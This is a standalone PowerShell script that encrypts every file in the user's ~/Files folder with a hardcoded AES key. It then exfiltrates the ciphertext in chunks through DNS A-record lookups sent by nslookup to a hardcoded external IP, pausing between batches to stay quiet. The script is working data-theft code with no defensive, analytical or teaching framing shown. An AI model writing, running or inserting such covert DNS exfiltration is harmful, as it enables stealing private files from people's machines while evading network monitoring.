function Create-AesManagedObject($key, $IV) {
$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 256
if ($IV) {
if ($IV.getType().Name -eq "String") {
$aesManaged.IV = [System.Convert]::FromBase64String($IV)
}
else {
$aesManaged.IV = $IV
}
}
if ($key) {
if ($key.getType().Name -eq "String") {
$aesManaged.Key = [System.Convert]::FromBase64String($key)
}
else {
$aesManaged.Key = $key
}
}
$aesManaged
}
function Encrypt-Bytes($key, $bytes) {
$aesManaged = Create-AesManagedObject $key
$encryptor = $aesManaged.CreateEncryptor()
$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[byte[]] $fullData = $aesManaged.IV + $encryptedData
$aesManaged.Dispose()
[System.Convert]::ToBase64String($fullData)
}
$k = "2zdYBNUy1wBHMZIo7n6KuqO8Vv8biVgvjxqD/+DSnhQ="
$d = "34.30.40.114"
$s = 4
$b = 57
Get-ChildItem "~/Files" | Foreach-Object {
$a = $_.Name
$z = [System.IO.File]::ReadAllBytes($_.FullName)
$e = Encrypt-Bytes $k $z
$l = $e.Length
$r = ""
$n = 0
while ($n -le ($l / $b)) {
$c = $b
if (($n * $b) + $c -gt $l) {
$c = $l - ($n * $b)
}
$r += $e.Substring($n * $b, $c) + "-."
if (($n % $s) -eq ($s - 1)) {
nslookup -type=A $r$a. $d; $r = ""
Start-Sleep -Milliseconds 157
}
$n = $n + 1
}
nslookup -type=A $r$a. $d
}